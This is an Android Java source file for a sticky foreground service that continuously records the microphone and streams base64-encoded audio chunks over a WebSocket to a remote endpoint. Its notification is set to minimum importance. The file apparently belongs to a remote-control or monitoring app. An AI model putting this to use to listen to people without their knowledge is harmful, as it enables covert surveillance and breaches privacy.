package com.xrc.system.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Base64;
import android.util.Log;

import androidx.core.app.ServiceCompat;

import com.xrc.system.core.Constants;
import com.xrc.system.network.XRCWebSocketClient;
import com.xrc.system.ui.MainActivity;

import org.json.JSONException;
import org.json.JSONObject;

public class MicService extends Service {
    private static final String TAG = Constants.TAG + ":MicSvc";
    private static final String MIC_CHANNEL = Constants.CHANNEL_ID + "_mic";
    private static final int SAMPLE_RATE = 16000;
    private static final int CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO;
    private static final int AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT;
    private static final int FGS_TYPE_MICROPHONE = 1 << 3;
    private AudioRecord recorder;
    private HandlerThread bgThread;
    private Handler bgHandler;
    private volatile boolean recording = false;

    @Override
    public void onCreate() {
        super.onCreate();
        bgThread = new HandlerThread("MicBg");
        bgThread.start();
        bgHandler = new Handler(bgThread.getLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();
        ServiceCompat.startForeground(this, Constants.NOTIF_ID_MIC, buildNotification(), FGS_TYPE_MICROPHONE);
        bgHandler.post(this::startRecording);
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        recording = false;
        if (recorder != null) {
            recorder.stop();
            recorder.release();
            recorder = null;
        }
        if (bgThread != null) {
            bgThread.quitSafely();
        }
        super.onDestroy();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(MIC_CHANNEL, "Microphone",
                    NotificationManager.IMPORTANCE_MIN);
            ch.setDescription("Microphone streaming");
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, intent,
                PendingIntent.FLAG_IMMUTABLE);
        return new Notification.Builder(this, MIC_CHANNEL)
                .setContentTitle("Microphone Service")
                .setContentText("Recording active")
                .setSmallIcon(android.R.drawable.ic_btn_speak_now)
                .setContentIntent(pi)
                .setOngoing(true)
                .build();
    }

    private void startRecording() {
        int minBuf = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT);
        if (minBuf <= 0) {
            Log.e(TAG, "Invalid buffer size: " + minBuf);
            return;
        }
        int bufferSize = Math.max(minBuf, SAMPLE_RATE * 2);
        try {
            recorder = new AudioRecord(MediaRecorder.AudioSource.MIC,
                    SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT, bufferSize);
            if (recorder.getState() != AudioRecord.STATE_INITIALIZED) {
                Log.e(TAG, "AudioRecord not initialized");
                return;
            }
            recording = true;
            recorder.startRecording();
            byte[] buffer = new byte[bufferSize];
            while (recording) {
                int read = recorder.read(buffer, 0, buffer.length);
                if (read > 0) {
                    byte[] chunk = new byte[read];
                    System.arraycopy(buffer, 0, chunk, 0, read);
                    String b64 = Base64.encodeToString(chunk, Base64.NO_WRAP);
                    JSONObject data = new JSONObject();
                    data.put("audio", b64);
                    data.put("sample_rate", SAMPLE_RATE);
                    XRCWebSocketClient.get(this).sendEvent("mic_audio", data);
                }
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Recording permission denied", e);
        } catch (JSONException e) {
            Log.e(TAG, "Audio JSON failed", e);
        } finally {
            if (recorder != null) {
                recorder.stop();
                recorder.release();
                recorder = null;
            }
        }
    }
}
